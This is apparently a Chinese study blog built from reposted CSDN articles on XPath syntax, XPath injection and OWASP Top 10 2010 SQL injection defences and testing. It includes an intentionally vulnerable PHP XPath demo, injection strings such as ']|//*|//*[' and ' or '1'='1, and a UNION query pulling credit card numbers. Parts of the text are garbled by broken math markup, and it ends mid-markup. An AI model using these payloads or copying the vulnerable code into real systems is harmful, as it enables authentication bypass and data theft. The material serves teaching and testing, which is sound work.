完全支持 XML Schema 数据类型<br>
很多新功能，包括正则表达式、日期/时间和字符串操作<br>
注释，虽然不是一个重要的特性，但是在调试查询时很方便：测试时可以注释掉路径的一部分<br>
具体案例如下，由于开发水平有限，用的也比较少，写起来实在蛋疼，这里就不多写了。</p>
<p>https://www.ibm.com/developerworks/cn/xml/x-wxxm35.html</p>
<p>0x01 Xpath表达式语法<br>
XPath 使用路径表达式来选取XML文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。</p>
<p>路径<br>
位置路径可以是绝对的，也可以是相对的。</p>
<p>绝对路径起始于正斜杠( / )，而相对路径不会这样。</p>
<p>在两种情况中，位置路径均包括一个或多个步，每个步均被斜杠分割：</p>
<p>一种是绝对路径<br>
/step/step/...</p>
<p>一种是相对路径<br>
step/step/...</p>
<p>步<br>
步(step)有以下几种</p>
<p>名称	定义<br>
轴（axis）	定义所选节点与当前节点之间的树关系<br>
节点测试（node-test）	识别某个轴内部的节点<br>
谓语（predicate）	更深入地提炼所选的节点集<br>
step的语法：</p>
<pre><code>轴名称::节点测试[谓语]
</code></pre>
<p>常见轴的名称<br>
轴可定义相对于当前节点的节点集。</p>
<p>轴名称	结果<br>
ancestor	选取当前节点的所有先辈（父、祖父等）。<br>
ancestor-or-self	选取当前节点的所有先辈（父、祖父等）以及当前节点本身。<br>
attribute	选取当前节点的所有属性。<br>
child	选取当前节点的所有子元素。<br>
descendant	选取当前节点的所有后代元素（子、孙等）。<br>
descendant-or-self	选取当前节点的所有后代元素（子、孙等）以及当前节点本身。<br>
following	选取文档中当前节点的结束标签之后的所有节点。<br>
namespace	选取当前节点的所有命名空间节点。<br>
parent	选取当前节点的父节点。<br>
preceding	选取文档中当前节点的开始标签之前的所有节点。<br>
preceding-sibling	选取当前节点之前的所有同级节点。<br>
self	选取当前节点。<br>
谓词（筛选表达式）<br>
XPath的谓词即筛选表达式，类似于SQL的where子句。</p>
<p>运算符/特殊字符	说明<br>
/	此路径运算符出现在模式开头时，表示应从根节点选择。<br>
//	从当前节点开始递归下降，此路径运算符出现在模式开头时，表示应从根节点递归下降。<br>
.	当前上下文。<br>
…	当前上下文节点父级。</p>
<ul>
<li>通配符；选择所有元素节点与元素名无关。（不包括文本，注释，指令等节点，如果也要包含这些节点请用node()函数）<br>
@	属性名的前缀。<br>
@*	选择所有属性，与名称无关。<br>
:	命名空间分隔符；将命名空间前缀与元素名或属性名分隔。<br>
( )	括号运算符(优先级最高)，强制运算优先级。<br>
[ ]	应用筛选模式（即谓词，包括&quot;过滤表达式&quot;和&quot;轴（向前/向后）&quot;）。<br>
|	两个节点集合的联合</li>
</ul>
<ul>
<li>
<p>减法。<br>
div	浮点除法。<br>
and, or	逻辑运算。<br>
mod	求余。<br>
not()	逻辑非<br>
=	等于<br>
!=	不等于<br>
&lt; ，&gt;，&gt;=，&lt;=	特殊比较运算符<br>
0x02 XPath学习测试<br>
XML 实例文档</p>
<data>
<users>
	<user>
		<name id='1'>hacker</name>
		<message>Hello hacker</message>
		<password>cisco123</password>
	</user>
	<user>
		<name id='2'>admin</name>
		<message>Hello admin</message>
		<password>s3cr3tP4ssw0rd</password>
	</user>
</users>
</data>
</li>
</ul>
<p>PHP代码<br>
//$x为上面的xml代码</p>
<pre><code>&lt;?php
$xml=simplexml_load_string($x);
$xpath = $_POST['name'];
print $xpath.&quot;&lt;hr&gt;&quot;;
$res = ($xml-&gt;xpath($xpath));
print_r($res);
}
?&gt;
</code></pre>
<p>测试用例<br>
选择文档根下面的所有元素节点，即根节点（XML文档只有一个根节点）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375527202.png" alt="" loading="lazy"><br>
user下所有的节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375530529.png" alt="" loading="lazy"><br>
user下的第一个节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375533768.png" alt="" loading="lazy"><br>
user下的最后一个节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375536933.png" alt="" loading="lazy"><br>
users下的第一个节点递归下降查找所有的文本节点（无限深度）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375540523.png" alt="" loading="lazy"><br>
第一个users节点下的所有子节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375544113.png" alt="" loading="lazy"><br>
user节点下name为admin的节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375547891.png" alt="" loading="lazy"><br>
user节点下name的属性名为id，且为1的节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375551247.png" alt="" loading="lazy"><br>
了解得差不多了，就不在继续了，暂时够用了。</p>
<p>XPath即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的语言。</p>
<p>//   	从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置<br>
//*	选取文档中的所有元素。<br>
']   	为闭合前面的节点<br>
|  	为分别执行，符号前后的路径都要查询<br>
//* 	为匹配所有节点<br>
//*[' 	为匹配后面的内容<br>
所以上面构造的链接：</p>
<pre><code>/demo.php?name=xml']|//*|//*['
</code></pre>
<p>意思应该是，执行了三次查询。分别是执行查找值为xml的元素，执行选取文档中的所有元素，执行值为空的选取文档中的所有元素。</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「吃肉唐僧」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_39936434/article/details/95471774<br>
————————————————<br>
版权声明：本文为CSDN博主「baynk」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/u014029795/article/details/105459096</p>
<h1 id="2021-08-07">2021-08-07</h1>
<p>OWASP TOP 10-2010<br>
开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。其目的是协助个人、企业和机构来发现和使用可信赖软件。<br>
OWASP发布了最新的Web应用脆弱性的top 10，这是继2007年OWASP对TOP10进行修订后进行的又一次更改，该版本暂定为OWASP TOP 10 - 2010。新版本的OWASP TOP10中主要有以下变化：<br>
1.Top10的命名发生了变化。<br>
原先的Top10全称为“The top 10 most critical web application security vulnerabilities”，即“Web应用的十大关键脆弱性”，现在Top10的全称为“The top 10 most critical web application security risks”，即“Web应用的十大关键风险”。<br>
2.OWASP Top 10的风险评估方法<br>
此次Top 10的评估是依据OWASP的风险评估方法来对OWASP TOP10排序的。<br>
3.替换了2个风险<br>
此次Top 10与2007年的Top 10相比，　在内容上去掉了“Malicious File Execution”(恶意文件执行)和“Information leakage and improper error handling”(信息泄露及不恰当的错误处理)，增加了“Security misconfiguration”(错误安全配置)和“Unvalidated redirects and forwards”(未验证的重定向和传递)。</p>
<p>** OWASP TOP10 2007	 OWASP TOP10 2010**<br>
A2-注入	 A1-注入<br>
A1-跨站脚本（XSS）	 A2-跨站脚本（XSS）<br>
A7-错误的认证和会话管理	 A3-错误的认证和会话管理<br>
A4-不正确的直接对象引用	 A4-不正确的直接对象引用<br>
A5-伪造跨站请求（CSRF）	 A5-伪造跨站请求（CSRF）<br>
A6-安全性误配置<br>
A10-限制远程访问失败	 A7-限制远程访问失败<br>
A8-未验证的重定向和传递<br>
A8-不安全的加密存储	 A9-不安全的加密存储<br>
A9-不足的传输层保护	 A10-不足的传输层保护<br>
A3-恶意文件执行	<br>
A6-不安全的通讯</p>
<p><strong>OWASP风险评估方法</strong><br>
OWASP所选取的10大风险是依据OWASP的风险评估方法，我们从标准的风险模型开始，即风险=可能性*后果，下面我们以以下步骤来说明某个风险的严重程度：<br>
第一步：识别风险<br>
识别风险作为评估的第一步，我们必须找到与这个风险相关的威胁、相应的攻击方法、隐含在里面的脆弱性以及最终可能造成的后果，当然可能存在多种攻击方法和多种后果，在评估时我们往往会采用最坏选择，这样就能更客观的反应该风险的最终评级；<br>
第二步：考虑影响可能性的因素<br>
通常，我们不可能很精准的说出某个风险的可能性数值，所以我们一般用高、中、低来表示，而且影响某个风险的可能性的因素有很多，对于每个因素我们用0到9的数值来表示。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303620083.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303650868.png" alt="" loading="lazy"><br>
第三步：考虑影响后果的因素<br>
在考虑攻击后果的时候，我们会考虑两种后果，一种是应用的“技术后果”，它所使用的数据，提供的功能等等，另一种就是它的“商业后果”，显然后者则更为重要，但往往后者难以估量，所以我们需要尽可能从技术上去考虑，进而来估计后者的数据。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303676539.png" alt="" loading="lazy"><br>
<strong>A1-注入</strong><br>
注入往往是应用程序缺少对输入进行安全性检查所引起的，攻击者把一些包含指令的数据发送给解释器，解释器会把收到的数据转换成指令执行。常见的注入包括SQL注入，OS Shell，LDAP，XPath，Hibernate等等，其中SQL注入尤为常见。这种攻击所造成的后果往往很大，一般整个数据库的信息都能被读取或篡改，通过SQL注入，攻击者甚至能够获得更多的包括管理员的权限。<br>
防范SQL注入——编程篇<br>
SQL注入往往是在程序员编写包含用户输入的动态数据库查询时产生的，但其实防范SQL注入的方法非常简单。程序员只要a）不再写动态查询，或b）防止用户输入包含能够破坏查询逻辑的恶意SQL语句，就能够防范SQL注入。在这篇文章中，我们将会说明一些非常简单的防止SQL注入的方法。<br>
　　我们用以下Java代码作为示例：</p>
<pre><code>String query =＂SELECT account_balance FROM user_data WHERE user_name =＂
+request.getParameter(＂customerName＂);

try {
Statement statement = connection.createStatement( …);
ResultSet results = Statement.executeQuery(query);
}
</code></pre>
<p>在以上代码中，我们可以看到并未对变量customerName做验证，customerName的值可以直接附在query语句的后面传送到数据库执行，则攻击者可以将任意的SQL语句注入。<br>
　**　防范方法1：参数化查询**<br>
　　参数化查询是所有开发人员在做数据库查询时首先需要学习的，参数化查询迫使所有开发者首先要定义好所有的SQL代码，然后再将每个参数逐个传入，这种编码风格就能够让数据库辨明代码和数据。<br>
　　参数化查询能够确保攻击者无法改变查询的内容，在下面修正过的例子中，如果攻击者输入了UsrID是    “’or ‘1 ‘=’1”，参数化查询会去查找一个完全满足名字为‘or ‘1 ‘=’ 1的用户。<br>
　　对于不同编程语言，有一些不同的建议：<br>
　　Java EE——使用带绑定变量的PreparedStatement()；<br>
　　.Net——使用带绑定变量的诸如SqlCommand()或OleDbCommand()的参数化查询；<br>
　　PHP——使用带强类型的参数化查询PDO（使用bindParam()）；<br>
　　Hibernate——使用带绑定变量的createQuery()。<br>
　　<br>
Java示例：<br>
String custname = request.getParameter(＂customerName＂);<br>
String query =＂SELECT account_balance FROM user_data WHERE user_name= ?＂;</p>
<pre><code>PreparedStatement pstmt = connection.prepareStatement(query);
Pstmt.setString(1,custname);
ResultSet results = pstmt.executeQuery();
　　C# .Net示例：
String query =＂SELECT account_balance FROM user_data WHERE user_name = ?＂;
Try {    
　　　OleDbCommand command = new OleDbCommand(query,connection);
　　　command.Parameters.Add(new OleDbParameter(＂customerName＂,CustomerName.Text));
　　　OleDbDataReader reader = command.ExecuteReader();
　　} catch (OleDbException se){
　　//error handling
}
</code></pre>
<p><strong>防范方法2：存储过程</strong><br>
　　存储过程和参数化查询的作用是一样的，唯一的不同在于存储过程是预先定义并存放在数据库中，从而被应用程序调用的。<br>
　　Java存储过程示例：</p>
<pre><code>String custname = request.getParameter(＂customerName＂);
try {
CallableStatement cs = connection.prepareCall(＂call sp_getAccountBalance(?)}＂);
cs.setString(1,custname);
Result results = cs.executeQuery();
}catch(SQLException se){
//error handling
}
</code></pre>
<p>VB .Net存储过程示例：</p>
<pre><code>Try
Dim command As SqlCommand = new SqlCommand(＂sp_getAccountBalance＂,connection)
command.CommandType = CommandType.StoredProcedure
command.Parameters.Add(new SqlParameter(＂@CustomerName＂,CustomerName.Text))
Dim reader As SqlDataReader = command.ExecuteReader()
‘…
Catch se As SqlException
‘error handling
End Try
</code></pre>
<p><strong>防范方法3：对所有用户输入进行转义</strong><br>
　　我们知道每个DBMS都有一个字符转义机制来告知DBMS输入的是数据而不是代码，如果我们将所有用户的输入都进行转义，那么DBMS就不会混淆数据和代码，也就不会出现SQL注入了。<br>
　　当然，如果要采用这种方法，那么你就需要对所使用的数据库转义机制，也可以使用现存的诸如OWASP ESAPI的escaping routines。ESAPI目前是基于MySQL和Oracle的转义机制的，使用起来也很方便。一个Oracle的ESAPI的使用示例如下：<br>
ESAPI.encoder().encodeForSQL(new OracleCodec(),queryparam);<br>
　　那么，假设你有一个要访问Oracle数据库的动态查询代码如下：</p>
<pre><code>String query =＂SELECT user_id FROM user_data WHERE user_name = ‘＂+req.getParameter(＂userID＂)+＂’ and user_password = ‘＂+req.getParameter(＂pwd＂)+＂’＂;
try {
Statement statement = connection.createStatement(…);
ResultSet results = statement.executeQuery(query) ;
}
</code></pre>
<p>那么，你就必须重写你的动态查询的第一行如下：</p>
<pre><code>Codec ORACLE_CODEC = new OracleCodec();
String query =＂SELECT user_id FROM user_data WHERE user_name = ‘＂+
ESAPI.encoder().encodeForSQL(ORACLE_CODEC,req.getParameter(＂userID＂))+＂’ and user_password = ‘＂+
ESAPI.encoder().encodeForSQL(ORACLE_CODEC,req.getParameter(＂pwd＂))+＂’＂;
　　当然，为了保证自己代码的可读性，我们也可以构建自己的OracleEncoder：
Encoder e = new OracleEncoder();
String query =＂SELECT user_id FROM user_data WHERE user_name = ‘＂
+oe.encode(req.getParameter(＂userID＂)) +＂’ and user_password = ‘＂   +oe.encode(req.getParameter(＂pwd＂))+＂’＂;
</code></pre>
<p>除了上面所说的三种防范方法以外，我们还建议可以用以下两种附加的方法来防范SQL注入：最小权限法、输入验证白名单法。<br>
　　最小权限法：<br>
　　为了避免注入攻击对数据库造成的损害，我们可以把每个数据库用户的权限尽可能缩小，不要把DBA或管理员的权限赋予你应用程序账户，在给用户权限时是基于用户需要什么样的权限，而不是用户不需要什么样的权限。当一个用户只需要读的权限时，我们就只给他读的权限，当用户只需要一张表的部分数据时，我们宁愿另建一个视图让他访问。<br>
　　如果你的策略是都是用存储过程的话，那么仅允许应用程序的账户执行这些查询，而不给他们直接访问数据库表的权限。诸如此类的最小权限法能够在很大程度上保证我们数据库的安全。<br>
　　输入验证白名单法：<br>
　　输入验证能够在数据传递到SQL查询前就察觉到输入是否正确合法，采用白名单而不是黑名单则能在更大程度上保证数据的合法性。<br>
防范SQL注入——测试篇<br>
对于测试人员来说，如何测试SQL注入漏洞是否存在呢？<br>
　　首先，我们将SQL注入攻击能分为以下三种类型：<br>
　　Inband：数据经由SQL代码注入的通道取出，这是最直接的一种攻击，通过SQL注入获取的信息直接反映到应用程序的Web页面上；<br>
　　Out-of-band：数据通过不同于SQL代码注入的方式获得（譬如通过邮件等）<br>
　　推理：这种攻击是说并没有真正的数据传输，但攻击者可以通过发送特定的请求，重组返回的结果从而得到一些信息。<br>
　　不论是哪种SQL注入，攻击者都需要构造一个语法正确的SQL查询，如果应用程序对一个不正确的查询返回了一个错误消息，那么就和容易重新构造初始的查询语句的逻辑，进而也就能更容易的进行注入；如果应用程序隐藏了错误信息，那么攻击者就必须对查询逻辑进行反向工程，即我们所谓的“盲SQL注入”<br>
　　黑盒测试及示例：<br>
　　这个测试的第一步是理解我们的应用程序在什么时候需要访问数据库，典型的需要访问数据库的时机是：<br>
　　认证表单：输入用户名和密码以检查是否有权限<br>
　　搜索引擎：提交字符串以从数据库中获取相应的记录<br>
　　电子商务站点：获取某类商品的价格等信息<br>
　　作为测试人员，我们需要列对所有输入域的值可能用于查询的字段做一个表单，包括那些POST请求的隐含字段，然后截取查询语句并产生错误信息。第一个测试往往是用一个单引号“‘”或是分号“；”，前者在SQL中是字符串终结符，如果应用程序没有过滤，则会产生一条错误信息；后者在SQL中是一条SQL语句的终结符，同样如果没有过滤，也会产生错误信息。在Microsoft SQL Server中，返回的错误信息一般是这样：</p>
<pre><code>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e14’
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the character string ‘’.
/target/target.asp, line 113
　　同样可用于测试的还有“--”以及SQL中的一些诸如“AND”的关键字，通常很常见的一种测试是在要求输入为数字的输入框中输入字符串，会返回如下的错误信息：
Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value ‘tester’ to a column of data type int.
/target/target.asp, line 113
</code></pre>
<p>类似上面这样的出错返回信息能让我们知道很多数据库的信息，通常不会返回那么多信息，会返回诸如“500 Server Error”的信息，那就需要“盲SQL注入”了。注意，我们需要对所有可能存在SQL注入漏洞的输入域进行测试，并且在每个测试用例时只变化一个域的值，从而才能找到真正存在漏洞的输入域。</p>
<p>下面我们看一下标准的SQL注入测试是怎样的。<br>
　　我们以下面的SQL查询为例：<br>
SELECT * FROM Users WHERE Username='<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant="normal">′</mo></msup><mi>A</mi><mi>N</mi><mi>D</mi><mi>P</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><msup><mo>=</mo><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">username&#x27; AND Password=&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>password'<br>
　　如果我们在页面上输入以下的用户名和密码：<br>
$username = 1' or '1' = '1<br>
$password = 1' or '1' = '1<br>
　　那么整个查询语句就变为：</p>
<pre><code>SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'
</code></pre>
<p>假设参数值是通过GET方法传递到服务器的，且域名为www.example.com，那么我们的访问请求就是：</p>
<pre><code>http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1
</code></pre>
<p>对上面的SQL语句作简单分析后我们就知道由于该语句永远为真，所以肯定会返回一些数据，在这种情况下实际上并未验证用户名和密码，并且在某些系统中，用户表的第一行记录是管理员，那这样造成的后果则更为严重。<br>
　　另外一个查询的例子如下：</p>
<pre><code>SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))
</code></pre>
<p>在这个例子中，存在两个问题，一个是括号的用法，还有一个是MD5哈希函数的用法。对于第一个问题，我们可以很容易找到缺失的右括号解决，对于第二个问题，我们可以想办法使第二个条件失效。我们在查询语句的最后加上一个注释符以表示后面的都是注释，常见的注释起始符是/*（在Oracle中是--），也就是说，我们用如下的用户名和密码：<br>
　　<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><mi>o</mi><msup><mi>r</mi><mo mathvariant="normal">′</mo></msup><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><msup><mo>=</mo><mo mathvariant="normal">′</mo></msup><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><mo>)</mo><mo>)</mo><mi mathvariant="normal">/</mi><mo>∗</mo><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi></mrow><annotation encoding="application/x-tex">username = 1&#x27; or &#x27;1&#x27; = &#x27;1&#x27;))/*
　　</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mord">/</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span></span></span></span>password = foo<br>
　　那么整条SQL语句就变为：</p>
<pre><code>SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))
</code></pre>
<p>我们的URL请求就变为：</p>
<pre><code>http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo
</code></pre>
<p>Union查询SQL注入测试<br>
　　还有一种测试是利用Union的，利用Union可以连接查询，从而从其他表中得到信息，假设我们有如下的查询：<br>
　　SELECT Name, Phone, Address FROM Users WHERE Id=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>d</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">设</mi><mi mathvariant="normal">置</mi><mi>i</mi><mi>d</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi></mrow><annotation encoding="application/x-tex">id
　　然后我们设置id的值为：
　　</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">置</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span></span></span></span>id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCarTable<br>
　　那么整体的查询就变为：<br>
　　SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCarTable<br>
　　显然这样就能得到所有信用卡用户的信息。<br>
　　盲SQL注入测试<br>
　　在上面我们提到过盲SQL注入，即blind SQL injection，它意味着对于某个操作我们得不到任何信息，通常这是由于程序员已经编写了特定的出错返回页面，从而隐藏了数据库结构的信息。<br>
　　利用推理方法，有时候我们能够恢复特定字段的值。这种方法通常采用一组对服务器的布尔查询，依据返回的结果来推断结果的含义。仍然延续上面的www.example.com，有一个参数名为id，那么我们输入以下url请求：</p>
<pre><code>http://www.example.com/index.php?id=1'
</code></pre>
<p>显然由于语法错误，我们会得到一个预先定义好的出错页面，假设服务器上的查询语句为SELECT field1, field2, field3 FROM Users WHERE Id='<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><msup><mi>d</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">，</mi><mi mathvariant="normal">假</mi><mi mathvariant="normal">设</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">想</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">得</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">户</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">段</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">些</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">逐</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">符</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">读</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">户</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">使</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi><mi>S</mi><mi>U</mi><mi>B</mi><mi>S</mi><mi>T</mi><mi>R</mi><mi>I</mi><mi>N</mi><mi>G</mi><mo>(</mo><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo separator="true">,</mo><mi>s</mi><mi>t</mi><mi>a</mi><mi>r</mi><mi>t</mi><mo separator="true">,</mo><mi>l</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo>)</mo><mi mathvariant="normal">，</mi><mi>A</mi><mi>S</mi><mi>C</mi><mi>I</mi><mi>I</mi><mo>(</mo><mi>c</mi><mi>h</mi><mi>a</mi><mi>r</mi><mo>)</mo><mi mathvariant="normal">，</mi><mi>L</mi><mi>E</mi><mi>N</mi><mi>G</mi><mi>T</mi><mi>H</mi><mo>(</mo><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>)</mo><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">定</mi><mi mathvariant="normal">义</mi><mi>i</mi><mi>d</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">：</mi><mi 